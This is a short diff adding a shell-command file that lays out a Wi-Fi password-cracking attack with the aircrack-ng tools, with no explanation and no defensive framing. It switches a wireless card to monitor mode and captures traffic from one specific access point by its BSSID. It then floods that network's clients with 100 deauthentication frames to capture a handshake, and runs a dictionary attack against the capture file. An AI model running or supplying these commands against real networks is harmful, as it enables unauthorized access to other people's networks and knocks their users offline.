@@ -1,0 +1,13 @@
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up   
+iwconfig  
+airmon-ng start wlan0
+airodump-ng wlan0 
+airodump-ng wlan0 --bssid 9C:65:EE:59:C9:37 --channel 1 --write lelelee
+
+#new window
+aireplay-ng --deauth 100 -a 9C:65:EE:59:C9:37 wlan0  
+
+#Dictonary attack
+aircrack-ng lelelee-01.cap -w passdxt.txt  
